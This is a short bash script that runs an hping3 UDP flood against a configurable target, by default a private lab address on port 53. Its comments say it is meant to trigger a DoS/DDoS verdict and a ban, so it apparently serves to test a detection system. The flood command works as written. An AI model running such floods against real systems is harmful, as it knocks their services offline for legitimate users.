#!/usr/bin/env bash
# UDP flood -> DoS/DDoS family.
# Expected: high Rate, UDP fraction ~1 -> DoS/DDoS verdict -> ban.
set -euo pipefail
TARGET="${TARGET:-172.30.0.10}"
PORT="${PORT:-53}"
DURATION="${DURATION:-15}"

echo "[udpflood] UDP flood -> ${TARGET}:${PORT} for ${DURATION}s"
if [ "${DURATION}" -gt 0 ]; then
  timeout "${DURATION}" hping3 --udp --flood -p "${PORT}" "${TARGET}" || true
else
  hping3 --udp --flood -p "${PORT}" "${TARGET}"
fi
echo "[udpflood] done"
